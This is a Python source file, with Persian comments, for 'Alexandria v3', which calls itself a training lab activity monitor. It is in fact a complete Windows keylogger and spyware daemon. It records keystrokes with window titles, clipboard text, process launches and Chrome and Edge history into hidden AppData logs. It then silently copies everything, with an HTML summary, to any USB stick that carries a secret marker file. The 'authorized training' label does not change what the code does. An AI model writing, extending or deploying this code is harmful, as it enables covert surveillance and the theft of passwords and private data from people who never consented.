"""
Alexandria v3 - Laboratory Activity Monitor
For authorized cybersecurity training only.

New in v3:
  - Auto-export when a specific USB is plugged in
  - Marker file detection (ALEXANDRIA.md with specific content)
  - USB plug/unplug event logging
"""
import sys, os, time, shutil, sqlite3, tempfile, json, socket, platform
import hashlib, zipfile, ctypes
from datetime import datetime, timedelta
from threading import Thread, Lock
from pynput import keyboard
import psutil, win32gui, win32process

# ---------- Config ----------
SCRIPT_DIR = os.path.dirname(os.path.abspath(sys.executable if getattr(sys, "frozen", False) else __file__))
CONFIG_FILE = os.path.join(SCRIPT_DIR, "config.json")

DEFAULT_CONFIG = {
    "browser_extract_interval": 300,
    "system_info_interval": 21600,
    "clipboard_interval": 3,
    "process_check_interval": 10,
    "idle_threshold_seconds": 120,
    "log_max_size_mb": 10,
    "enable_clipboard": True,
    "enable_process_monitor": True,
    "enable_idle_detection": True,
    "enable_usb_events": True,
    "enable_zip_export": True,
    "enable_html_report": True,
    "enable_sha256": True,
    "auto_export_enabled": True,
    "auto_export_marker_file": "ALEXANDRIA.md",
    "auto_export_marker_content": "ALEXANDRIA-AUTHORIZED-EXPORT-KEY-v3-2026",
    "auto_export_check_interval": 5,
}

def load_config():
    cfg = dict(DEFAULT_CONFIG)
    for path in [CONFIG_FILE, os.path.join(os.environ.get("APPDATA", ""), "Alexandria", "config.json")]:
        try:
            if os.path.isfile(path):
                with open(path, "r", encoding="utf-8") as f:
                    cfg.update(json.load(f))
                break
        except Exception:
            pass
    return cfg

CFG = load_config()

# ---------- Paths ----------
BASE_DIR = os.path.join(os.environ["APPDATA"], "Alexandria")
LOG_DIR = os.path.join(BASE_DIR, "logs")
os.makedirs(LOG_DIR, exist_ok=True)

_write_lock = Lock()

def log_path(name):
    day = datetime.now().strftime("%Y%m%d")
    return os.path.join(LOG_DIR, f"{name}_{day}.txt")

def safe_write(path, text):
    try:
        with _write_lock:
            if os.path.exists(path) and os.path.getsize(path) > CFG["log_max_size_mb"] * 1024 * 1024:
                rotated = path.replace(".txt", f"_{int(time.time())}.txt")
                os.rename(path, rotated)
            with open(path, "a", encoding="utf-8") as f:
                f.write(text + "\n")
    except Exception:
        pass

# ---------- Single instance ----------
def ensure_single_instance():
    try:
        kernel32 = ctypes.windll.kernel32
        mutex_name = "Global\\Alexandria_Lab_Monitor_Mutex_2026"
        handle = kernel32.CreateMutexW(None, False, mutex_name)
        if kernel32.GetLastError() == 183:
            sys.exit(0)
        return handle
    except Exception:
        return None

# ---------- Idle detection ----------
class LASTINPUTINFO(ctypes.Structure):
    _fields_ = [("cbSize", ctypes.c_uint), ("dwTime", ctypes.c_uint)]

def get_idle_seconds():
    try:
        lii = LASTINPUTINFO()
        lii.cbSize = ctypes.sizeof(lii)
        ctypes.windll.user32.GetLastInputInfo(ctypes.byref(lii))
        millis = ctypes.windll.kernel32.GetTickCount() - lii.dwTime
        return millis / 1000.0
    except Exception:
        return 0

# ---------- Drive helpers ----------
def is_removable_drive(path):
    try:
        drive = os.path.splitdrive(os.path.abspath(path))[0] + "\\"
        return ctypes.windll.kernel32.GetDriveTypeW(drive) == 2
    except Exception:
        return False

def list_removable_drives():
    """لیست حرف درایوهای قابل جابجایی مثل ['E:\\', 'F:\\']"""
    drives = []
    try:
        for part in psutil.disk_partitions(all=False):
            try:
                drive = part.device[:2] + "\\"
                if ctypes.windll.kernel32.GetDriveTypeW(drive) == 2:
                    drives.append(drive)
            except Exception:
                pass
    except Exception:
        pass
    return drives

def check_marker(drive, filename, expected_content):
    """بررسی وجود و محتوای فایل نشانه روی درایو"""
    try:
        marker_path = os.path.join(drive, filename)
        if not os.path.isfile(marker_path):
            return False
        with open(marker_path, "r", encoding="utf-8", errors="ignore") as f:
            content = f.read().strip()
        return content == expected_content.strip()
    except Exception:
        return False

# ---------- Export ----------
def compute_sha256(path):
    h = hashlib.sha256()
    try:
        with open(path, "rb") as f:
            for chunk in iter(lambda: f.read(65536), b""):
                h.update(chunk)
        return h.hexdigest()
    except Exception:
        return None

def generate_html_report(log_dir, report_path):
    stats = {
        "total_keystrokes": 0,
        "total_window_changes": 0,
        "total_browser_visits": 0,
        "total_clipboard": 0,
        "total_processes": 0,
        "total_usb_events": 0,
        "auto_exports": 0,
        "top_apps": {},
        "top_sites": {},
        "hourly_activity": {h: 0 for h in range(24)},
        "date_range": "",
    }
    dates = []

    for fname in sorted(os.listdir(log_dir)):
        fpath = os.path.join(log_dir, fname)
        if not os.path.isfile(fpath) or not fname.endswith(".txt"):
            continue
        try:
            with open(fpath, "r", encoding="utf-8", errors="ignore") as f:
                for line in f:
                    if "keylog_" in fname and "CHAR:" in line:
                        stats["total_keystrokes"] += 1
                    elif "activity_" in fname and "ACTIVE:" in line:
                        stats["total_window_changes"] += 1
                        try:
                            proc = line.split("ACTIVE:")[1].split("|")[0].strip()
                            stats["top_apps"][proc] = stats["top_apps"].get(proc, 0) + 1
                        except Exception:
                            pass
                    elif "browser_" in fname and "—" in line:
                        stats["total_browser_visits"] += 1
                        try:
                            url = line.split("—")[-1].strip()
                            domain = url.split("/")[2] if "://" in url else url
                            stats["top_sites"][domain] = stats["top_sites"].get(domain, 0) + 1
                        except Exception:
                            pass
                    elif "clipboard_" in fname:
                        stats["total_clipboard"] += 1
                    elif "process_" in fname:
                        stats["total_processes"] += 1
                    elif "usb_" in fname:
                        stats["total_usb_events"] += 1
                        if "AUTO-EXPORT COMPLETED" in line:
                            stats["auto_exports"] += 1
                    if line.startswith("["):
                        try:
                            ts = line[1:20]
                            hour = int(ts[11:13])
                            stats["hourly_activity"][hour] += 1
                            if ts[:10] not in dates:
                                dates.append(ts[:10])
                        except Exception:
                            pass
        except Exception:
            pass

    if dates:
        stats["date_range"] = f"{min(dates)} → {max(dates)}"

    top_apps = sorted(stats["top_apps"].items(), key=lambda x: -x[1])[:10]
    top_sites = sorted(stats["top_sites"].items(), key=lambda x: -x[1])[:10]
    max_hour = max(stats["hourly_activity"].values()) or 1

    html = f"""<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<title>Alexandria Report - {stats['date_range']}</title>
<style>
  body {{ font-family: 'Segoe UI', sans-serif; background: #0d1117; color: #c9d1d9; padding: 20px; }}
  h1 {{ color: #58a6ff; border-bottom: 2px solid #30363d; padding-bottom: 10px; }}
  h2 {{ color: #79c0ff; margin-top: 30px; }}
  .card {{ background: #161b22; border: 1px solid #30363d; border-radius: 8px; padding: 20px; margin: 15px 0; }}
  .stat {{ display: inline-block; margin: 10px 30px 10px 0; }}
  .stat .num {{ font-size: 32px; font-weight: bold; color: #58a6ff; }}
  .stat .lbl {{ font-size: 13px; color: #8b949e; }}
  table {{ width: 100%; border-collapse: collapse; }}
  th, td {{ padding: 8px 12px; text-align: left; border-bottom: 1px solid #30363d; }}
  th {{ color: #8b949e; font-weight: 500; }}
  .bar {{ height: 14px; background: #1f6feb; border-radius: 3px; display: inline-block; vertical-align: middle; }}
  .hour-row {{ display: flex; align-items: center; gap: 10px; margin: 3px 0; }}
  .hour-lbl {{ width: 60px; color: #8b949e; font-size: 12px; }}
  .footer {{ margin-top: 40px; font-size: 12px; color: #484f58; text-align: center; }}
</style>
</head>
<body>
<h1>Alexandria Activity Report</h1>
<p><strong>Date Range:</strong> {stats['date_range']}</p>
<p><strong>Generated:</strong> {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}</p>

<div class="card">
<h2>Summary</h2>
<div class="stat"><div class="num">{stats['total_keystrokes']:,}</div><div class="lbl">Keystrokes</div></div>
<div class="stat"><div class="num">{stats['total_window_changes']:,}</div><div class="lbl">Window Changes</div></div>
<div class="stat"><div class="num">{stats['total_browser_visits']:,}</div><div class="lbl">Browser Visits</div></div>
<div class="stat"><div class="num">{stats['total_clipboard']:,}</div><div class="lbl">Clipboard Events</div></div>
<div class="stat"><div class="num">{stats['total_processes']:,}</div><div class="lbl">Process Launches</div></div>
<div class="stat"><div class="num">{stats['total_usb_events']:,}</div><div class="lbl">USB Events</div></div>
<div class="stat"><div class="num">{stats['auto_exports']:,}</div><div class="lbl">Auto-Exports</div></div>
</div>

<div class="card">
<h2>Top Applications</h2>
<table>
<tr><th>Application</th><th>Activations</th></tr>
{''.join(f"<tr><td>{a}</td><td>{c:,}</td></tr>" for a, c in top_apps) or "<tr><td colspan='2'>No data</td></tr>"}
</table>
</div>

<div class="card">
<h2>Top Visited Sites</h2>
<table>
<tr><th>Domain</th><th>Visits</th></tr>
{''.join(f"<tr><td>{s}</td><td>{c:,}</td></tr>" for s, c in top_sites) or "<tr><td colspan='2'>No data</td></tr>"}
</table>
</div>

<div class="card">
<h2>Hourly Activity (24h)</h2>
{''.join(f'<div class="hour-row"><div class="hour-lbl">{h:02d}:00</div><div class="bar" style="width: {int(stats["hourly_activity"][h]/max_hour*400)}px"></div><span style="color:#8b949e;font-size:12px">{stats["hourly_activity"][h]:,}</span></div>' for h in range(24))}
</div>

<div class="footer">
Generated by Alexandria v3 | For authorized laboratory use only
</div>
</body>
</html>"""

    try:
        with open(report_path, "w", encoding="utf-8") as f:
            f.write(html)
        return True
    except Exception:
        return False


def export_to_usb(target_dir, trigger="manual"):
    target_dir = target_dir.strip().strip('"').rstrip('\\/')
    if not target_dir or not os.path.isdir(target_dir):
        print(f"[!] Invalid target directory: {target_dir}")
        return False
    if not is_removable_drive(target_dir):
        print(f"[!] Target is NOT a removable USB drive: {target_dir}")
        return False

    dest = os.path.join(target_dir, "logs_export")
    os.makedirs(dest, exist_ok=True)

    files = [f for f in os.listdir(LOG_DIR) if os.path.isfile(os.path.join(LOG_DIR, f))]

    for fname in files:
        try:
            shutil.copy2(os.path.join(LOG_DIR, fname), os.path.join(dest, fname))
        except Exception:
            pass

    if CFG.get("enable_html_report", True):
        generate_html_report(LOG_DIR, os.path.join(dest, "report.html"))

    if CFG.get("enable_sha256", True):
        hashes = {}
        for fname in files:
            h = compute_sha256(os.path.join(dest, fname))
            if h:
                hashes[fname] = h
        try:
            with open(os.path.join(dest, "_hashes.sha256"), "w", encoding="utf-8") as f:
                for name, h in hashes.items():
                    f.write(f"{h}  {name}\n")
        except Exception:
            pass

    if CFG.get("enable_zip_export", True):
        zip_path = os.path.join(target_dir, "alexandria_export.zip")
        try:
            with zipfile.ZipFile(zip_path, "w", zipfile.ZIP_DEFLATED) as z:
                for fname in os.listdir(dest):
                    z.write(os.path.join(dest, fname), fname)
            print(f"[+] ZIP archive created: {zip_path}")
        except Exception as e:
            print(f"[!] ZIP failed: {e}")

    try:
        with open(os.path.join(dest, "_summary.txt"), "w", encoding="utf-8") as f:
            f.write("Alexandria v3 Export\n")
            f.write(f"Export time: {datetime.now()}\n")
            f.write(f"Trigger: {trigger}\n")
            f.write(f"Source: {LOG_DIR}\n")
            f.write(f"Target: {target_dir}\n")
            f.write(f"Files copied: {len(files)}\n")
    except Exception:
        pass

    print(f"[+] {len(files)} log file(s) copied to {dest} (trigger={trigger})")
    return True


# ---------- Auto-Export Monitor ----------
def auto_export_monitor():
    """پایش خودکار فلش و export در صورت تطابق نشانه"""
    if not CFG.get("auto_export_enabled", False):
        return

    marker_file = CFG.get("auto_export_marker_file", "ALEXANDRIA.md")
    marker_content = CFG.get("auto_export_marker_content", "")
    interval = CFG.get("auto_export_check_interval", 5)

    if not marker_file:
        return

    already_exported = set()  # درایوهایی که در این اتصال export شدند
    known_drives = set()      # برای تشخیص اتصال/قطع

    # لاگ شروع
    ts = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    safe_write(log_path("usb"), f"[{ts}] AUTO-EXPORT MONITOR STARTED (marker={marker_file})")

    while True:
        try:
            current_drives = set(list_removable_drives())

            # تشخیص اتصال جدید
            for drive in current_drives - known_drives:
                ts = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
                safe_write(log_path("usb"), f"[{ts}] USB CONNECTED: {drive}")

            # تشخیص قطع
            for drive in known_drives - current_drives:
                ts = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
                safe_write(log_path("usb"), f"[{ts}] USB DISCONNECTED: {drive}")

            # بررسی نشانه در درایوهای جدید
            for drive in current_drives:
                if drive in already_exported:
                    continue

                if check_marker(drive, marker_file, marker_content):
                    ts = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
                    safe_write(log_path("usb"),
                        f"[{ts}] MARKER MATCHED: {drive} — starting auto-export")

                    ok = export_to_usb(drive, trigger="auto")

                    ts2 = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
                    status = "COMPLETED" if ok else "FAILED"
                    safe_write(log_path("usb"),
                        f"[{ts2}] AUTO-EXPORT {status}: {drive}")

                    if ok:
                        already_exported.add(drive)

            # پاک کردن درایوهایی که دیگه وصل نیستند
            already_exported &= current_drives
            known_drives = current_drives

        except Exception:
            pass

        time.sleep(interval)


# ---------- VK mapping ----------
SPECIAL_VK = {
    keyboard.Key.enter: 13, keyboard.Key.space: 32, keyboard.Key.tab: 9,
    keyboard.Key.backspace: 8, keyboard.Key.esc: 27, keyboard.Key.delete: 46,
    keyboard.Key.shift: 16, keyboard.Key.shift_l: 160, keyboard.Key.shift_r: 161,
    keyboard.Key.ctrl: 17, keyboard.Key.ctrl_l: 162, keyboard.Key.ctrl_r: 163,
    keyboard.Key.alt: 18, keyboard.Key.alt_l: 164, keyboard.Key.alt_r: 165,
    keyboard.Key.alt_gr: 165, keyboard.Key.cmd: 91,
    keyboard.Key.cmd_l: 91, keyboard.Key.cmd_r: 92,
    keyboard.Key.up: 38, keyboard.Key.down: 40,
    keyboard.Key.left: 37, keyboard.Key.right: 39,
    keyboard.Key.home: 36, keyboard.Key.end: 35,
    keyboard.Key.page_up: 33, keyboard.Key.page_down: 34,
    keyboard.Key.insert: 45, keyboard.Key.caps_lock: 20,
    keyboard.Key.num_lock: 144, keyboard.Key.scroll_lock: 145,
    keyboard.Key.print_screen: 44, keyboard.Key.pause: 19,
    keyboard.Key.f1: 112, keyboard.Key.f2: 113, keyboard.Key.f3: 114,
    keyboard.Key.f4: 115, keyboard.Key.f5: 116, keyboard.Key.f6: 117,
    keyboard.Key.f7: 118, keyboard.Key.f8: 119, keyboard.Key.f9: 120,
    keyboard.Key.f10: 121, keyboard.Key.f11: 122, keyboard.Key.f12: 123,
}

def get_vk(key):
    try:
        return key.vk
    except AttributeError:
        pass
    return SPECIAL_VK.get(key)

def vk_to_english(vk):
    if vk is None:
        return "?"
    if 65 <= vk <= 90:
        return chr(vk).lower()
    if 48 <= vk <= 57:
        return chr(vk)
    if 96 <= vk <= 105:
        return f"num{vk - 96}"
    names = {
        13: "<enter>", 32: "<space>", 9: "<tab>", 8: "<backspace>",
        27: "<esc>", 46: "<delete>", 16: "<shift>", 160: "<shift_l>",
        161: "<shift_r>", 17: "<ctrl>", 162: "<ctrl_l>", 163: "<ctrl_r>",
        18: "<alt>", 164: "<alt_l>", 165: "<alt_r>", 91: "<win_l>",
        92: "<win_r>", 38: "<up>", 40: "<down>", 37: "<left>", 39: "<right>",
        36: "<home>", 35: "<end>", 33: "<page_up>", 34: "<page_down>",
        45: "<insert>", 20: "<caps_lock>", 144: "<num_lock>",
        145: "<scroll_lock>", 44: "<print_screen>", 19: "<pause>",
        186: ";", 187: "=", 188: ",", 189: "-", 190: ".", 191: "/",
        192: "`", 219: "[", 220: "\\", 221: "]", 222: "'",
        112: "<f1>", 113: "<f2>", 114: "<f3>", 115: "<f4>",
        116: "<f5>", 117: "<f6>", 118: "<f7>", 119: "<f8>",
        120: "<f9>", 121: "<f10>", 122: "<f11>", 123: "<f12>",
    }
    return names.get(vk, f"vk_{vk}")

# ---------- Keyboard logger ----------
current_window = {"title": "Unknown", "process": "Unknown"}

def update_current_window():
    global current_window
    while True:
        try:
            hwnd = win32gui.GetForegroundWindow()
            title = win32gui.GetWindowText(hwnd)
            _, pid = win32process.GetWindowThreadProcessId(hwnd)
            proc = psutil.Process(pid).name()
            current_window = {"title": title, "process": proc}
        except Exception:
            pass
        time.sleep(1)

def on_press(key):
    ts = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    if CFG.get("enable_idle_detection") and get_idle_seconds() > CFG["idle_threshold_seconds"]:
        return
    prefix = f"[{ts}] [{current_window['process']}] [{current_window['title']}]"
    vk = get_vk(key)
    en = vk_to_english(vk)
    try:
        c = key.char
        native = c if (c and ord(c) >= 32) else (f"<ctrl:{ord(c):02x}>" if c else "<unknown>")
    except AttributeError:
        native = str(key).replace("Key.", "<") + ">"
    safe_write(log_path("keylog"),
        f"{prefix} CHAR: {native} | EN: {en} | VK: {vk if vk is not None else '?'}")

# ---------- Window activity ----------
def monitor_activity():
    last = None
    while True:
        cur = f"{current_window['process']} | {current_window['title']}"
        if cur != last:
            ts = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
            safe_write(log_path("activity"), f"[{ts}] ACTIVE: {cur}")
            last = cur
        time.sleep(3)

# ---------- Clipboard ----------
def monitor_clipboard():
    import win32clipboard
    last = ""
    while True:
        try:
            win32clipboard.OpenClipboard()
            try:
                data = win32clipboard.GetClipboardData()
            finally:
                win32clipboard.CloseClipboard()
            if data and data != last:
                preview = str(data)[:500].replace("\r", " ").replace("\n", " ")
                ts = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
                safe_write(log_path("clipboard"),
                    f"[{ts}] [{current_window['process']}] CLIP: {preview}")
                last = data
        except Exception:
            pass
        time.sleep(CFG["clipboard_interval"])

# ---------- Process monitor ----------
def monitor_processes():
    seen = set()
    try:
        for p in psutil.process_iter(["pid"]):
            seen.add(p.info["pid"])
    except Exception:
        pass
    while True:
        try:
            for p in psutil.process_iter(["pid", "name", "exe", "username"]):
                pid = p.info.get("pid")
                if pid and pid not in seen:
                    seen.add(pid)
                    name = p.info.get("name") or "?"
                    exe = p.info.get("exe") or ""
                    user = p.info.get("username") or ""
                    ts = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
                    safe_write(log_path("process"),
                        f"[{ts}] LAUNCH: {name} | PID: {pid} | USER: {user} | EXE: {exe}")
            alive = set(p.pid for p in psutil.process_iter(["pid"]))
            seen &= alive
        except Exception:
            pass
        time.sleep(CFG["process_check_interval"])

# ---------- Browser history ----------
def extract_browser_history():
    paths = {
        "Chrome": os.path.expanduser(r"~\AppData\Local\Google\Chrome\User Data\Default\History"),
        "Edge":   os.path.expanduser(r"~\AppData\Local\Microsoft\Edge\User Data\Default\History"),
    }
    for browser, db in paths.items():
        if not os.path.exists(db):
            continue
        tmp = os.path.join(tempfile.gettempdir(), f"{browser}_hist_copy")
        try:
            shutil.copy2(db, tmp)
            conn = sqlite3.connect(tmp)
            cur = conn.cursor()
            cur.execute("SELECT url, title, last_visit_time FROM urls ORDER BY last_visit_time DESC LIMIT 100")
            for url, title, vt in cur.fetchall():
                try:
                    dt = datetime(1601, 1, 1) + timedelta(microseconds=vt)
                    ts = dt.strftime("%Y-%m-%d %H:%M:%S")
                except Exception:
                    ts = "Unknown"
                safe_write(log_path("browser"), f"[{ts}] {browser}: {title} — {url}")
            conn.close()
        except Exception:
            pass
        finally:
            if os.path.exists(tmp):
                try: os.remove(tmp)
                except: pass

# ---------- System info ----------
def log_system_info():
    info = {
        "hostname": socket.gethostname(),
        "os": platform.system() + " " + platform.release(),
        "arch": platform.machine(),
        "cpu": psutil.cpu_count(),
        "ram_gb": round(psutil.virtual_memory().total / (1024**3), 2),
        "user": os.getlogin() if hasattr(os, "getlogin") else "Unknown",
        "time": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
    }
    safe_write(log_path("system"), json.dumps(info, ensure_ascii=False))

# ---------- Daemon ----------
def run_daemon():
    log_system_info()
    Thread(target=update_current_window, daemon=True).start()
    time.sleep(1)
    listener = keyboard.Listener(on_press=on_press)
    listener.start()
    Thread(target=monitor_activity, daemon=True).start()

    def periodic_browser():
        while True:
            extract_browser_history()
            time.sleep(CFG["browser_extract_interval"])
    Thread(target=periodic_browser, daemon=True).start()

    def periodic_system():
        while True:
            time.sleep(CFG["system_info_interval"])
            log_system_info()
    Thread(target=periodic_system, daemon=True).start()

    if CFG.get("enable_clipboard"):
        Thread(target=monitor_clipboard, daemon=True).start()
    if CFG.get("enable_process_monitor"):
        Thread(target=monitor_processes, daemon=True).start()

    # Auto-Export Monitor (جایگزین monitor_usb_events)
    if CFG.get("auto_export_enabled"):
        Thread(target=auto_export_monitor, daemon=True).start()

    listener.join()

# ---------- Main ----------
if __name__ == "__main__":
    if len(sys.argv) >= 3 and sys.argv[1] == "--export":
        export_to_usb(sys.argv[2], trigger="manual-cli")
    else:
        _mutex = ensure_single_instance()
        run_daemon()